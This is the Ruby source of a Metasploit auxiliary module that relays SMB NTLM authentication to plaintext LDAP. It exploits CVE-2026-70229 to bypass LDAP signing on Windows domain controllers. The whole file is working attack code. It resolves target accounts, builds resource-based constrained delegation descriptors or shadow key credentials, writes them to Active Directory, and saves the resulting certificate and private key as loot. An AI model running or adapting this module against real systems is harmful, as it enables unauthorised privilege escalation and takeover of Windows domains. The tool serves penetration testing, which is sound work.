##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::RelayServer
  include Msf::Exploit::Remote::LDAP::ActiveDirectoryAttributeBuilders
  include Msf::Auxiliary::Report

  RBCD_ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze
  SHADOW_ATTRIBUTE = 'msDS-KeyCredentialLink'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows SMB to LDAP Signing Bypass Relay',
        'Description' => %q{
          This module relays an SMB NTLM authentication to plaintext LDAP and
          exploits CVE-2026-70229 by reauthenticating a signed SASL connection.
          It stacks one prepared LDAP modification in the protected record that
          contains the victim's final bind. It supports RBCD and shadow
          credentials against affected Windows Server 2016 through 2025 domain
          controllers before their October 2026 cumulative updates.

          The module creates no session. It does not coerce authentication,
          acquire tickets, or perform subsequent execution.
        },
        'Author' => [
          'mad31k', # Vulnerability discovery
          'Raj Patel', # LDAP reauthentication research
          'Duane Michael', # Research contributor
          'jheysel-r7' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-70229'],
          ['URL', 'https://specterops.io/blog/2026/10/23/ldap-signing-bypass-ntlm-relay/'],
          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-70229'],
          ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE],
          ['ATT&CK', Mitre::Attack::Technique::T1098_ACCOUNT_MANIPULATION]
        ],
        'Actions' => [
          ['RBCD', { 'Description' => 'Add an ACE to the target RBCD descriptor' }],
          ['SHADOW_CREDENTIALS', { 'Description' => 'Add a shadow key credential to the target' }]
        ],
        'PassiveActions' => %w[RBCD SHADOW_CREDENTIALS],
        'DefaultAction' => 'RBCD',
        'DefaultOptions' => {
          'RPORT' => 389
        },
        'DisclosureDate' => '2026-10-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ACCOUNT_LOCKOUTS],
          'Reliability' => [EVENT_DEPENDENT]
        }
      )
    )

    register_options([
      Opt::RPORT,
      OptEnum.new('BOOTSTRAP_AUTH', [true, 'Authentication mode for the initial signed LDAP context', 'ANONYMOUS', %w[ANONYMOUS NTLM]]),
      OptString.new('LDAPDomain', [false, 'Domain for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
      OptString.new('LDAPUsername', [false, 'Username for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
      OptString.new('LDAPPassword', [false, 'Password for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
      OptString.new('TARGET_ACCOUNT', [true, 'Target sAMAccountName or full DN; DN required for RBCD with RBCDOverwrite or anonymous SHADOW_CREDENTIALS']),
      OptString.new('DELEGATE_FROM', [false, 'Existing controlled sAMAccountName or direct SID'], conditions: %w[ACTION == RBCD])
    ])

    register_advanced_options([
      OptString.new('BASE_DN', [false, 'Directory search base; discovered when possible']),
      OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
      OptBool.new('RBCDOverwrite', [true, 'Replace the entire RBCD descriptor without reading or backing it up; requires a target DN and delegate SID', false], conditions: %w[ACTION == RBCD])
    ])
  end

  # Validate transport, action, and bootstrap-authentication options before running.
  #
  # @return [void]
  # @raise [Msf::OptionValidateError] if an option combination cannot support the technique
  def validate
    super

    if datastore['RPORT'] == 636
      raise Msf::OptionValidateError, { 'RPORT' => 'LDAPS is not supported; use plaintext LDAP with SASL protection' }
    end

    if action.name == 'SHADOW_CREDENTIALS' && datastore['BOOTSTRAP_AUTH'] == 'ANONYMOUS' && !distinguished_name?(datastore['TARGET_ACCOUNT'])
      raise Msf::OptionValidateError, { 'TARGET_ACCOUNT' => 'Anonymous SHADOW_CREDENTIALS requires a full target DN to avoid directory lookups; use NTLM bootstrap to resolve an account name' }
    end

    if action.name == 'RBCD' && datastore['DELEGATE_FROM'].blank?
      raise Msf::OptionValidateError, { 'DELEGATE_FROM' => 'DELEGATE_FROM must be set for the RBCD action' }
    end

    if action.name == 'RBCD' && datastore['DELEGATE_FROM'].start_with?('S-')
      begin
        Rex::Proto::MsDtyp::MsDtypSid.new(datastore['DELEGATE_FROM'])
      rescue ArgumentError => e
        raise Msf::OptionValidateError, { 'DELEGATE_FROM' => e.message }
      end
    end

    if action.name == 'RBCD' && datastore['RBCDOverwrite']
      unless distinguished_name?(datastore['TARGET_ACCOUNT'])
        raise Msf::OptionValidateError, { 'TARGET_ACCOUNT' => 'RBCDOverwrite requires a full target DN because directory lookups are skipped' }
      end
      unless datastore['DELEGATE_FROM'].start_with?('S-')
        raise Msf::OptionValidateError, { 'DELEGATE_FROM' => 'RBCDOverwrite requires a direct SID because directory lookups are skipped' }
      end
    end

    return unless datastore['BOOTSTRAP_AUTH'] == 'NTLM'

    missing = %w[LDAPDomain LDAPUsername LDAPPassword].select { |name| datastore[name].nil? || datastore[name].empty? }
    unless missing.empty?
      raise Msf::OptionValidateError, (missing.to_h { |name| [name, "#{name} must be explicitly set for NTLM bootstrap authentication"] })
    end
  end

  # Build the LDAP relay targets and select the dedicated reauthentication client.
  #
  # @return [Msf::Exploit::Remote::Relay::TargetList] configured relay target list
  def relay_targets
    Msf::Exploit::Remote::Relay::TargetList.new(
      :ldap,
      datastore['RPORT'],
      datastore['RHOSTS'],
      randomize_targets: datastore['RANDOMIZE_TARGETS'],
      drop_mic_only: false,
      drop_mic_and_sign_key_exch_flags: false,
      protocol_options: {
        relay_client: Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient,
        bootstrap_auth: bootstrap_auth,
        bootstrap_mode: datastore['BOOTSTRAP_AUTH'],
        base_dn: datastore['BASE_DN'],
        proxies: datastore['Proxies'],
        track_unknown_identity: true,
        operation_preparer: method(:prepare_relay_operation)
      }
    )
  end

  # Start the SMB relay listener and wait for an independently triggered NTLM authentication.
  #
  # @return [void]
  def run
    if action.name == 'RBCD' && datastore['RBCDOverwrite']
      print_warning('RBCDOverwrite is enabled: the entire RBCD descriptor will be replaced without being read or backed up. Existing delegation entries may be lost and cannot be restored by this module.')
    end

    start_service
    print_status('Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.')
    service.wait if service
  end

  # Report a completed victim authentication and prepared directory modification.
  #
  # @param relay_connection [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient] completed relay connection
  # @param relay_identity [String] resolved victim identity
  # @return [void]
  def on_relay_success(relay_connection:, relay_identity:)
    report_relay_outcome(relay_connection, relay_identity)
  ensure
    relay_connection.disconnect!
  end

  # Report a failed or uncertain relay attempt without treating it as a session.
  #
  # @param relay_connection [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient] completed relay connection
  # @return [void]
  def on_relay_failure(relay_connection:)
    report_relay_outcome(relay_connection, relay_connection.relay_identity)
  ensure
    relay_connection.disconnect!
  end

  private

  # Return the explicitly selected anonymous or credentialed bootstrap identity.
  #
  # @return [Hash] NTLM authentication parameters for the initial signed SASL context
  def bootstrap_auth
    if datastore['BOOTSTRAP_AUTH'] == 'ANONYMOUS'
      { username: '', password: '', domain: '', anonymous_sasl: true }
    else
      {
        username: datastore['LDAPUsername'],
        password: datastore['LDAPPassword'],
        domain: datastore['LDAPDomain']
      }
    end
  end

  # Resolve action inputs and build the connection-owned LDAP modification.
  #
  # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
  # @param discovered_base_dn [String, nil] base DN discovered through the bootstrap context
  # @param relay_target [Msf::Exploit::Remote::Relay::Target] current relay target
  # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared modification
  def prepare_relay_operation(ldap, discovered_base_dn, relay_target)
    base_dn = datastore['BASE_DN'].presence || discovered_base_dn
    read_attribute = RBCD_ATTRIBUTE if action.name == 'RBCD' && !datastore['RBCDOverwrite']
    target = resolve_target(ldap, datastore['TARGET_ACCOUNT'], base_dn, read_attribute: read_attribute)

    if action.name == 'RBCD'
      prepare_rbcd_operation(ldap, target[:dn], target[:name], base_dn, relay_target)
    else
      prepare_shadow_operation(target[:dn], target[:name], relay_target)
    end
  end

  # Resolve an explicit DN or sAMAccountName to a target object.
  #
  # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
  # @param target_account [String] operator-supplied DN or sAMAccountName
  # @param base_dn [String, nil] directory search base
  # @param read_attribute [String, nil] attribute that must be read during resolution
  # @return [Hash] target distinguished name and display name
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError] if the target cannot be resolved
  def resolve_target(ldap, target_account, base_dn, read_attribute: nil)
    if distinguished_name?(target_account)
      target = { dn: target_account, name: target_account.split(',', 2).first.split('=', 2).last }
      return target unless read_attribute

      entry = ldap_search!(
        ldap,
        base: target_account,
        scope: Net::LDAP::SearchScope_BaseObject,
        attributes: [read_attribute]
      ).first
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: target DN #{target_account} was not readable" unless entry

      return { dn: entry.dn, name: target[:name] }
    end

    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, 'Lookup failed: a BASE_DN or direct target DN is required' if base_dn.blank?

    attributes = [:distinguishedName]
    attributes << read_attribute if read_attribute
    candidates = [target_account]
    candidates << "#{target_account}$" unless target_account.end_with?('$')
    candidates.each do |candidate|
      entries = ldap_search!(
        ldap,
        base: base_dn,
        filter: Net::LDAP::Filter.eq('sAMAccountName', candidate),
        attributes: attributes
      )
      entry = entries.first
      return { dn: entry.dn, name: candidate } if entry
    end

    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: sAMAccountName #{target_account} was not found or is not visible to the #{datastore['BOOTSTRAP_AUTH']} bootstrap identity; check BASE_DN and directory read access"
  end

  # Build an RBCD update, preserving the current descriptor unless overwrite is explicit.
  #
  # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
  # @param target_dn [String] target distinguished name
  # @param target_name [String] target display name
  # @param base_dn [String, nil] directory search base
  # @param relay_target [Msf::Exploit::Remote::Relay::Target] current relay target
  # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared RBCD modification
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError] if the current descriptor cannot be read
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError] if the descriptor or recovery data is invalid
  def prepare_rbcd_operation(ldap, target_dn, target_name, base_dn, relay_target)
    overwrite = datastore['RBCDOverwrite']
    current_value = nil
    unless overwrite
      entry = ldap_search!(
        ldap,
        base: target_dn,
        scope: Net::LDAP::SearchScope_BaseObject,
        attributes: [RBCD_ATTRIBUTE]
      ).first
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: current #{RBCD_ATTRIBUTE} could not be established" unless entry

      current_value = entry[RBCD_ATTRIBUTE].first
    end

    delegate = resolve_delegate_sid(ldap, datastore['DELEGATE_FROM'], base_dn)
    delegate_sid = delegate[:sid]
    current_descriptor = current_value && Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(current_value)
    if current_descriptor&.dacl&.aces&.any? { |ace| ace.body.sid == delegate_sid }
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError, "RBCD is already configured from #{delegate_sid}"
    end

    descriptor = adds_build_rbcd_security_descriptor(delegate_sid, current_value: current_value)
    new_value = descriptor.to_binary_s
    backup_path = store_rbcd_backup(relay_target, target_dn, current_value) if current_value
    if current_value && backup_path.blank?
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError, 'RBCD recovery information could not be persisted'
    end

    print_status("Prepared RBCD write on #{target_dn} for #{delegate_sid}#{" (#{delegate[:name]})" if delegate[:name]}")

    Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation.new(
      dn: target_dn,
      attribute: RBCD_ATTRIBUTE,
      # A missing value may be hidden by LDAP access controls. Modify-add fails
      # if this single-valued attribute already exists, preserving unknown data.
      type: overwrite || current_value ? :replace : :add,
      attribute_values: [new_value],
      confirmation: lambda do |values|
        values.any? do |value|
          sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(value)
          sd.dacl&.aces&.any? { |ace| ace.body.sid == delegate_sid }
        rescue BinData::ValidityError, IOError
          false
        end
      end,
      recovery: {
        backup_path: backup_path,
        original_present: overwrite ? nil : !current_value.nil?,
        overwrite: overwrite,
        delegate_sid: delegate_sid.to_s
      },
      metadata: {
        action: 'RBCD',
        target_name: target_name,
        target_dn: target_dn,
        delegate_sid: delegate_sid.to_s
      }
    )
  rescue BinData::ValidityError, IOError => e
    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError, "Current RBCD security descriptor is invalid: #{e.message}"
  end

  # Generate and persist a shadow credential before preparing its LDAP ADD operation.
  #
  # @param target_dn [String] target distinguished name
  # @param target_name [String] certificate subject derived from the target
  # @param relay_target [Msf::Exploit::Remote::Relay::Target] current relay target
  # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared shadow-credential addition
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError] if credential or recovery material cannot be persisted
  def prepare_shadow_operation(target_dn, target_name, relay_target)
    material = adds_generate_key_credential(dn: target_dn, subject: target_name)
    pkcs12 = OpenSSL::PKCS12.create('', '', material[:private_key], material[:certificate])
    device_id = material[:credential].device_id.to_s
    path = store_loot(
      'windows.ad.shadow_credential',
      'application/x-pkcs12',
      relay_target.ip,
      pkcs12.to_der,
      "shadow_credential_#{device_id}.pfx",
      "Shadow credential for #{target_dn}, device ID #{device_id}"
    )
    if path.blank?
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError, 'Shadow credential material could not be persisted'
    end

    recovery_path = store_loot(
      'windows.ad.shadow_credential.recovery',
      'text/plain',
      relay_target.ip,
      material[:value],
      "shadow_credential_#{device_id}.txt",
      "Exact #{SHADOW_ATTRIBUTE} value for device ID #{device_id}"
    )
    if recovery_path.blank?
      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError, 'Shadow credential recovery value could not be persisted'
    end

    print_status("Prepared shadow credential with device ID #{device_id}; empty-password PKCS#12 certificate and private key stored at #{path}")
    print_status("Exact recovery value stored at #{recovery_path}")

    Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation.new(
      dn: target_dn,
      attribute: SHADOW_ATTRIBUTE,
      type: :add,
      attribute_values: [material[:value]],
      confirmation: lambda do |values|
        values.any? do |value|
          credential = Rex::Proto::MsAdts::KeyCredential.from_struct(
            Rex::Proto::MsAdts::MsAdtsKeyCredentialStruct.read(Rex::Proto::LDAP::DnBinary.decode(value).data)
          )
          credential.device_id.to_s.casecmp?(device_id)
        rescue ArgumentError, BinData::ValidityError, IOError
          false
        end
      end,
      recovery: {
        value: material[:value],
        device_id: device_id,
        credential_path: path,
        recovery_path: recovery_path
      },
      metadata: {
        action: 'SHADOW_CREDENTIALS',
        target_name: target_name,
        target_dn: target_dn,
        device_id: device_id,
        credential_path: path,
        recovery_path: recovery_path
      }
    )
  end

  # Resolve an existing controlled account name or validate a direct SID.
  #
  # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
  # @param delegate_from [String] operator-supplied sAMAccountName or SID
  # @param base_dn [String, nil] directory search base
  # @return [Hash] resolved SID and optional account name
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError] if the SID cannot be established
  def resolve_delegate_sid(ldap, delegate_from, base_dn)
    if delegate_from.start_with?('S-')
      return { sid: Rex::Proto::MsDtyp::MsDtypSid.new(delegate_from), name: nil }
    end

    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, 'Lookup failed: a BASE_DN or direct DELEGATE_FROM SID is required' if base_dn.blank?

    candidates = [delegate_from]
    candidates << "#{delegate_from}$" unless delegate_from.end_with?('$')
    candidates.each do |candidate|
      entry = ldap_search!(
        ldap,
        base: base_dn,
        filter: Net::LDAP::Filter.eq('sAMAccountName', candidate),
        attributes: [:objectSid]
      ).first
      next unless entry&.[](:objectSid)&.first

      return { sid: Rex::Proto::MsDtyp::MsDtypSid.read(entry[:objectSid].first), name: candidate }
    end

    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: DELEGATE_FROM #{delegate_from} was not found"
  end

  # Run an LDAP search and translate a non-success result into a lookup failure.
  #
  # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
  # @param args [Hash] arguments passed to the LDAP search operation
  # @return [Array<Net::LDAP::Entry>, nil] search entries returned by the server
  # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError] if the server rejects the search
  def ldap_search!(ldap, **args)
    entries = ldap.search(**args)
    result = ldap.get_operation_result
    return entries if result.code == Net::LDAP::ResultCodeSuccess

    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: LDAP result #{result.code} #{result.error_message}"
  rescue Net::LDAP::Error => e
    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: #{e.message}"
  end

  # Determine whether an operator value has the shape of a distinguished name.
  #
  # @param value [String] operator-supplied account identifier
  # @return [Boolean] true when the value resembles a DN
  def distinguished_name?(value)
    value.match?(/\A[^=,]+=.+,.+=/)
  end

  # Persist an existing RBCD descriptor for exact recovery.
  #
  # @param relay_target [Msf::Exploit::Remote::Relay::Target] current relay target
  # @param target_dn [String] target distinguished name
  # @param value [String] existing binary RBCD descriptor
  # @return [String, nil] stored loot path, or nil if persistence failed
  def store_rbcd_backup(relay_target, target_dn, value)
    store_loot(
      'windows.ad.rbcd',
      'application/octet-stream',
      relay_target.ip,
      value,
      'rbcd_security_descriptor.bin',
      "Original #{RBCD_ATTRIBUTE} for #{target_dn}"
    )
  end

  # Report authentication and modification outcomes without creating an LDAP session.
  #
  # @param relay_connection [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient] completed relay connection
  # @param relay_identity [String, nil] resolved victim identity
  # @return [void]
  def report_relay_outcome(relay_connection, relay_identity)
    outcome = relay_connection.outcome
    metadata = relay_connection.operation&.metadata || {}
    identity = relay_identity.presence || 'unknown identity'

    case outcome.authentication
    when :success
      print_good("Victim authentication succeeded as #{identity}")
    when :rejected
      print_warning("Victim authentication failed: #{outcome.reason}")
    else
      print_warning("Victim authentication is unconfirmed: #{outcome.reason}")
    end

    case outcome.modification
    when :success
      print_good("#{metadata[:action]} modification confirmed on #{metadata[:target_dn]}")
      if outcome.authentication == :success
        service = report_service(host: relay_connection.target.ip, port: relay_connection.target.port, proto: 'tcp', name: 'ldap')
        report_vuln(
          host: relay_connection.target.ip,
          port: relay_connection.target.port,
          proto: 'tcp',
          name: 'CVE-2026-70229 LDAP signing bypass',
          refs: references,
          info: "Relayed #{identity} and modified #{relay_connection.operation.attribute} on #{metadata[:target_dn]}",
          service: service
        )
      else
        print_warning('The change is confirmed, but victim authentication could not be independently confirmed')
      end
    when :denied
      print_warning("Modification was denied: #{outcome.reason}")
    when :not_executed
      print_warning("Modification was not attempted: #{outcome.reason}")
    when :failed
      print_warning("Modification failed: #{outcome.reason}")
    else
      print_warning("Modification is unconfirmed: #{outcome.reason}")
    end

    if metadata[:action] == 'SHADOW_CREDENTIALS'
      print_status("Credential material remains at #{metadata[:credential_path]}; remove only device ID #{metadata[:device_id]} or the exact value at #{metadata[:recovery_path]} to recover")
    elsif metadata[:action] == 'RBCD'
      recovery = relay_connection.operation.recovery
      if recovery[:overwrite]
        print_warning('RBCD recovery: the original descriptor was not read or backed up. Removing the added ACE cannot restore overwritten entries; restore previous settings from an independent backup.')
      else
        print_status("RBCD recovery: remove only the ACE for SID #{recovery[:delegate_sid]}#{"; original descriptor stored at #{recovery[:backup_path]}" if recovery[:backup_path]}")
      end
    end
  end
end
